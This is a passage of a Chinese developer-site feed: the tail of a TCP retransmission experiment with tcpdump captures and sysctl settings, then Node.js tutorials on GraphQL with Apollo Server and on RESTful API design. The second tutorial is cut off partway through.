10:12:36.673761 tun0  Out IP 192.168.165.47.8080 &gt; 192.0.2.1.50647: Flags [P.], seq 1:101, ack 1, win 64240, length 100: HTTP
10:12:36.887178 tun0  Out IP 192.168.165.47.8080 &gt; 192.0.2.1.50647: Flags [P.], seq 1:101, ack 1, win 64240, length 100: HTTP
10:12:37.103192 tun0  Out IP 192.168.165.47.8080 &gt; 192.0.2.1.50647: Flags [P.], seq 1:101, ack 1, win 64240, length 100: HTTP
10:12:37.535174 tun0  Out IP 192.168.165.47.8080 &gt; 192.0.2.1.50647: Flags [P.], seq 1:101, ack 1, win 64240, length 100: HTTP
10:12:38.399184 tun0  Out IP 192.168.165.47.8080 &gt; 192.0.2.1.50647: Flags [P.], seq 1:101, ack 1, win 64240, length 100: HTTP
10:12:40.127180 tun0  Out IP 192.168.165.47.8080 &gt; 192.0.2.1.50647: Flags [P.], seq 1:101, ack 1, win 64240, length 100: HTTP
#
</code></pre>
<p>继续关闭 TLP 的情况，仍然是测试 SACK 开启的脚本。</p>
<pre><code class="hljs language-plain" lang="plain"># sysctl -q net.ipv4.tcp_early_retrans=0
# sysctl -a|grep early_retrans
net.ipv4.tcp_early_retrans = 0
# 
</code></pre>
<p>执行脚本，同时通过 tcpdump 抓取数据包，现象如下，可以看到与关闭 SACK 的首次测试结果一致，标准的超时重传现象。对于关闭 TLP 和开启 TLP 的两次实验结果，可得知第一次重传数据包确实是 TLP 报文。</p>
<pre><code class="hljs language-plain" lang="plain"># tcpdump -i any -nn port 8080
tcpdump: data link type LINUX_SLL2
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on any, link-type LINUX_SLL2 (Linux cooked v2), snapshot length 262144 bytes
10:17:24.423493 tun0  In  IP 192.0.2.1.35821 &gt; 192.168.117.180.8080: Flags [S], seq 0, win 10000, options [mss 1000,nop,nop,sackOK], length 0
10:17:24.423527 tun0  Out IP 192.168.117.180.8080 &gt; 192.0.2.1.35821: Flags [S.], seq 1548070828, ack 1, win 64240, options [mss 1460,nop,nop,sackOK], length 0
10:17:24.433632 tun0  In  IP 192.0.2.1.35821 &gt; 192.168.117.180.8080: Flags [.], ack 1, win 10000, length 0
10:17:24.533759 tun0  Out IP 192.168.117.180.8080 &gt; 192.0.2.1.35821: Flags [P.], seq 1:101, ack 1, win 64240, length 100: HTTP
10:17:24.751193 tun0  Out IP 192.168.117.180.8080 &gt; 192.0.2.1.35821: Flags [P.], seq 1:101, ack 1, win 64240, length 100: HTTP
10:17:25.183189 tun0  Out IP 192.168.117.180.8080 &gt; 192.0.2.1.35821: Flags [P.], seq 1:101, ack 1, win 64240, length 100: HTTP
10:17:26.047181 tun0  Out IP 192.168.117.180.8080 &gt; 192.0.2.1.35821: Flags [P.], seq 1:101, ack 1, win 64240, length 100: HTTP
10:17:27.775172 tun0  Out IP 192.168.117.180.8080 &gt; 192.0.2.1.35821: Flags [P.], seq 1:101, ack 1, win 64240, length 100: HTTP
#
</code></pre>
<h2 data-id="heading-4">问题总结</h2>
<p>实际上对于重传触发出来的原因，或者说重传的归类，远远不止众所周知的超时重传、快速重传这两种，后续再慢慢展开分享吧。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Node.js 编程实战：GraphQL 简介与实战]]></title>    <link>https://juejin.cn/post/7589839433322070079</link>    <guid>https://juejin.cn/post/7589839433322070079</guid>    <pubDate>2026-01-02T05:16:01.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589839433322070079" data-draft-id="7589919989038481471" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Node.js 编程实战：GraphQL 简介与实战"/> <meta itemprop="keywords" content="后端,前端,Node.js"/> <meta itemprop="datePublished" content="2026-01-02T05:16:01.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="程序员爱钓鱼"/> <meta itemprop="url" content="https://juejin.cn/user/2799775299157614"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Node.js 编程实战：GraphQL 简介与实战
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2799775299157614/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    程序员爱钓鱼
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T05:16:01.000Z" title="Fri Jan 02 2026 05:16:01 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>随着前端应用复杂度不断提升，传统 RESTful API 在接口数量、数据冗余和版本维护方面逐渐暴露出一些问题。GraphQL 作为一种由 Facebook 提出的数据查询语言，为前后端数据交互提供了新的思路。在 Node.js 生态中，GraphQL 已经成为构建复杂数据接口的重要选择。</p>
</blockquote>
<p>本文将从 GraphQL 的核心概念出发，结合 Node.js 实战，介绍其基本用法和适用场景。</p>
<hr/>
<h2 data-id="heading-0">一、GraphQL 是什么</h2>
<p>GraphQL 是一种用于 API 的查询语言，同时也是一种运行时。客户端可以精确描述自己需要的数据结构，服务端只返回对应字段，从而避免多余数据传输。</p>
<p>与 REST 强调“资源”不同，GraphQL 更强调“数据关系”和“查询结构”，这使它在复杂数据场景下非常灵活。</p>
<hr/>
<h2 data-id="heading-1">二、为什么选择 GraphQL</h2>
<p>在实际项目中，GraphQL 主要解决了以下问题。</p>
<p>第一，减少接口数量。一个 GraphQL 接口可以覆盖多种查询需求。
第二，避免数据冗余。客户端只获取所需字段。
第三，降低前后端协作成本。接口变更对客户端影响更可控。</p>
<p>对于数据模型复杂、客户端多样化的系统，GraphQL 优势尤为明显。</p>
<hr/>
<h2 data-id="heading-2">三、GraphQL 的核心概念</h2>
<p>GraphQL 主要由以下几个核心概念组成。</p>
<ul>
<li>Schema：定义数据结构和接口能力</li>
<li>Query：查询数据</li>
<li>Mutation：修改数据</li>
<li>Resolver：字段解析函数</li>
</ul>
<p>这些概念共同构成了 GraphQL 的运行基础。</p>
<hr/>
<h2 data-id="heading-3">四、在 Node.js 中搭建 GraphQL 服务</h2>
<p>在 Node.js 中，常用 <code>apollo-server</code> 来构建 GraphQL 服务。</p>
<pre><code class="hljs language-bash" lang="bash">npm install apollo-server graphql
</code></pre>
<p>创建一个最基本的 GraphQL 服务。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> { <span class="hljs-title class_">ApolloServer</span>, gql } = <span class="hljs-built_in">require</span>(<span class="hljs-string">'apollo-server'</span>);

<span class="hljs-keyword">const</span> typeDefs = gql<span class="hljs-string">`
  type Query {
    hello: String
  }
`</span>;

<span class="hljs-keyword">const</span> resolvers = {
  <span class="hljs-title class_">Query</span>: {
    <span class="hljs-attr">hello</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-string">'Hello GraphQL'</span>
  }
};

<span class="hljs-keyword">const</span> server = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApolloServer</span>({ typeDefs, resolvers });
server.<span class="hljs-title function_">listen</span>();
</code></pre>
<p>启动后即可通过 GraphQL Playground 进行测试。</p>
<hr/>
<h2 data-id="heading-4">五、定义 Schema 与数据模型</h2>
<p>Schema 是 GraphQL 的核心，定义了 API 能提供的数据结构。</p>
<pre><code class="hljs language-graphql" lang="graphql"><span class="hljs-keyword">type</span> User <span class="hljs-punctuation">{</span>
  <span class="hljs-symbol">id</span><span class="hljs-punctuation">:</span> ID<span class="hljs-punctuation">!</span>
  <span class="hljs-symbol">name</span><span class="hljs-punctuation">:</span> String
  <span class="hljs-symbol">age</span><span class="hljs-punctuation">:</span> Int
<span class="hljs-punctuation">}</span>

<span class="hljs-keyword">type</span> <span class="hljs-keyword">Query</span> <span class="hljs-punctuation">{</span>
  <span class="hljs-symbol">users</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>User<span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>Schema 让接口能力变得自描述，也成为前后端协作的重要契约。</p>
<hr/>
<h2 data-id="heading-5">六、Resolver 的工作机制</h2>
<p>Resolver 负责将 Schema 中的字段映射到真实数据。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> resolvers = {
  <span class="hljs-title class_">Query</span>: {
    <span class="hljs-attr">users</span>: <span class="hljs-function">() =&gt;</span> {
      <span class="hljs-keyword">return</span> [
        { <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Tom'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">20</span> }
      ];
    }
  }
};
</code></pre>
<p>每一个字段都可以有对应的解析函数，这也是 GraphQL 灵活性的来源。</p>
<hr/>
<h2 data-id="heading-6">七、数据修改与 Mutation</h2>
<p>GraphQL 使用 Mutation 来完成数据写入操作。</p>
<pre><code class="hljs language-graphql" lang="graphql"><span class="hljs-keyword">type</span> <span class="hljs-keyword">Mutation</span> <span class="hljs-punctuation">{</span>
  createUser<span class="hljs-punctuation">(</span><span class="hljs-symbol">name</span><span class="hljs-punctuation">:</span> String, <span class="hljs-symbol">age</span><span class="hljs-punctuation">:</span> Int<span class="hljs-punctuation">)</span><span class="hljs-punctuation">:</span> User
<span class="hljs-punctuation">}</span>
</code></pre>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title class_">Mutation</span>: {
  <span class="hljs-attr">createUser</span>: <span class="hljs-function">(<span class="hljs-params">_, args</span>) =&gt;</span> {
    <span class="hljs-keyword">return</span> { <span class="hljs-attr">id</span>: <span class="hljs-number">2</span>, ...args };
  }
}
</code></pre>
<p>这种方式使数据变更逻辑更加集中和可控。</p>
<hr/>
<h2 data-id="heading-7">八、GraphQL 与 REST 的对比</h2>
<p>REST 接口往往需要多个请求才能获取完整数据，而 GraphQL 可以通过一次查询完成。</p>
<p>但 GraphQL 也并非适合所有场景。对于结构简单、变化不大的接口，REST 依然是高效选择。GraphQL 更适合复杂数据关系和高定制化需求。</p>
<hr/>
<h2 data-id="heading-8">九、GraphQL 安全与性能考虑</h2>
<p>GraphQL 的灵活性也带来了潜在风险。</p>
<p>需要重点关注：</p>
<ul>
<li>查询深度和复杂度限制</li>
<li>权限控制与字段级鉴权</li>
<li>错误信息的合理返回</li>
<li>缓存与性能优化</li>
</ul>
<p>合理的约束是 GraphQL 服务稳定运行的前提。</p>
<hr/>
<h2 data-id="heading-9">十、适合使用 GraphQL 的场景</h2>
<p>GraphQL 通常适用于以下场景：</p>
<ul>
<li>前端页面数据结构复杂</li>
<li>多端客户端共用同一 API</li>
<li>接口频繁调整、迭代快</li>
<li>对网络请求数量敏感</li>
</ul>
<p>在这些场景下，GraphQL 可以显著提升开发效率。</p>
<hr/>
<h2 data-id="heading-10">十一、总结</h2>
<p>GraphQL 为 Node.js API 开发提供了一种全新的思路。通过 Schema 描述能力、通过 Query 精准获取数据，它让接口更加灵活、可维护。</p>
<p>在实际项目中，应根据业务复杂度和团队经验合理选择 REST 或 GraphQL，甚至两者并存，才能发挥最大价值。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Node.js 编程实战：RESTful API 设计]]></title>    <link>https://juejin.cn/post/7589839433322037311</link>    <guid>https://juejin.cn/post/7589839433322037311</guid>    <pubDate>2026-01-02T05:13:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589839433322037311" data-draft-id="7589916567876861994" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Node.js 编程实战：RESTful API 设计"/> <meta itemprop="keywords" content="后端,前端,Node.js"/> <meta itemprop="datePublished" content="2026-01-02T05:13:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="程序员爱钓鱼"/> <meta itemprop="url" content="https://juejin.cn/user/2799775299157614"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Node.js 编程实战：RESTful API 设计
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2799775299157614/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    程序员爱钓鱼
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T05:13:08.000Z" title="Fri Jan 02 2026 05:13:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>在现代 Web 与移动应用中，后端服务大多以 API 的形式对外提供能力。RESTful API 是目前最常见、最成熟的一种接口设计风格。一个设计良好的 RESTful API，不仅能提升前后端协作效率，还能显著降低系统维护成本。</p>
</blockquote>
<p>本文将结合 Node.js 实际开发经验，系统讲解 RESTful API 的设计原则与落地实践。</p>
<hr/>
<h2 data-id="heading-0">一、什么是 RESTful API</h2>
<p>REST 是一种基于资源的架构风格，它强调通过统一的接口来操作资源，而不是暴露具体的业务实现。RESTful API 通常基于 HTTP 协议，通过 URL 表示资源，通过 HTTP 方法表示操作。</p>
<p>在 REST 设计中，接口应该是可预测、语义清晰、易于理解的。</p>
<hr/>
<h2 data-id="heading-1">二、资源导向的接口设计</h2>
<p>RESTful API 的核心是“资源”，而不是“动作”。</p>
<p>资源通常使用名词表示，并以复数形式出现。</p>
<pre><code class="hljs language-bash" lang="bash">/users
/orders
/products
</code></pre>
<p>通过这种方式，可以直观地看出接口所操作的对象，避免接口含义模糊。</p>
<hr/>
<h2 data-id="heading-2">三、HTTP 方法的合理使用</h2>
<p>RESTful API 使用 HTTP 方法来描述对资源的操作行为。</p>
<ul>
<li>GET：获取资源</li>
<li>POST：创建资源</li>
<li>PUT：整体更新资源</li>
<li>PATCH：部分更新资源</li>
<li>DELETE：删除资源</li>
</ul>
<p>例如：</p>
<pre><code class="hljs language-bash" lang="bash">GET    /users
POST   /users
GET    /users/1
PUT    /users/1
DELETE /users/1
</code></pre>
<p>这种设计方式让接口语义一目了然。</p>
<hr/>
<h2 data-id="heading-3">四、状态码的正确返回</h2>
<p>HTTP 状态码是 RESTful API 的重要组成部分。</p>
<p>常见状态码包括：</p>
<ul>
<li>200：请求成功</li>
<li>201：资源创建成功</li>
<li>400：请求参数错误</li>
<li>401：未认证</li>
<li>403：无权限</li>
<li>404：资源不存在</li>
<li>500：服务器错误</li>
</ul>
<p>合理使用状态码，可以让客户端快速判断请求结果。</p>
<hr/>
<h2 data-id="heading-4">五、统一的响应结构</h2>
<p>为了方便前端处理，接口应返回统一的数据结构。</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"code"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"message"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"success"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"data"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span><span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>无论成功还是失败，都遵循统一格式，有助于降低客户端复杂度。</p>
<hr/>
<h2 data-id="heading-5">六、参数设计与校验</h2>
<p>RESTful API 中的参数主要来自三种位置：</p>
<ul>
<li>路径参数</li>
<li>查询参数</li>
<li>请求体参数</li>
</ul>
<p>所有外部参数都必须进行校验，避免非法数据进入系统。参数校验既是稳定性保障，也是安全防护的重要组成部分。</p>
<hr/>
<h2 data-id="heading-6">七、错误处理与异常设计</h2>
<p>接口不应直接返回系统异常信息，而应对错误进行抽象。</p>
<pre><code class="hljs language-js" lang="js">res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">json</span>({
  <span class="hljs-attr">code</span>: <span class="hljs-number">40001</span>,
  <span class="hljs-attr">message</span>: <span class="hljs-string">'invalid parameter'</span>
});
</code></pre>
<p>通过错误码与错误信息的组合，可以在不暴露内部细节的前提下，提供足够的调试信息。</p>
<hr/>
<h2 data-id="heading-7">八、接口版本控制</h2>
<p>随着业务迭代，接口不可避免会发生变化。</p>
<p>常见的版本控制方式包括：</p>
<pre><code class="hljs language-bash" lang="bash">/api/v1/users
/api/v2/users
</code></pre>
<p>明确的版本号可以避免旧客户端受到影响，是长期维护系统的必要手段。</p>
<hr/>
<h2 data-id="heading-8">九、分页、排序与过滤设计</h2>
<p>在列表接口中，分页是必不可少的设计。</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"page"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"pageSize"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">20</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"total"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">100</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"list"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>同时，支持排序和过滤，可以让接口更加灵活，减少重复接口的出现。</p>
<hr/>
<h2 data-id="heading-9">十、RESTful API 与 Express 的结合</h2>
<p>Express 非常适合用来实现 RESTful API。</p>
<pre><code class="hljs language-js" lang="js">app.<span class="hljs-title function_">get</span>(<span class="hljs-string">'/users'</span>, controller.<span class="hljs-property">list</span>);
app.<span class="hljs-title function_">post</span>(<span class="hljs-string">'/users'</span>, controller.<span class="hljs-property">create</span>);
app.<span class="hljs-title function_">get</span>(<span class="hljs-string">'/users/:id'</span>, controller.<span class="hljs-property">detail</span>);
</code></pre>
<p>通过路由拆分和控制器分层，可以保持代码结构清晰。</p>
<hr/>
<h2 data-id="heading-10">十一、文档与接口规范</h2>
